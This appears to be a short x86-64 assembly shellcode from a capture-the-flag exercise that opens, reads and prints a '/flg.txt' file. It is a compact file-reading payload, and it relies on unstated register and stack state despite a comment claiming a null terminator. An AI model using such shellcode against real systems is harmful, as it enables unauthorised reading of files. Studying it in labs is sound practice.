section .text
_start:
    ; push './flg.txt\x00'
    mov rdi, 0x7478742e676c662f  ; "/flg.txt" en reversa
    push rdi
    mov rdi, rsp                 ; move pointer to filename

    ; open('rsp', 'O_RDONLY')
    mov al, 2                    ; open syscall number
    syscall

    ; read file
    mov rdi, rax                 ; set fd to rax from open syscall
    mov rsi, rsp                 ; pointer to opened file
    mov dl, 0x30                 ; size to read
    xor al, al                   ; read syscall number
    syscall

    ; write output
    mov al, 1                    ; write syscall
    mov dil, 1                    ; set fd to stdout
    syscall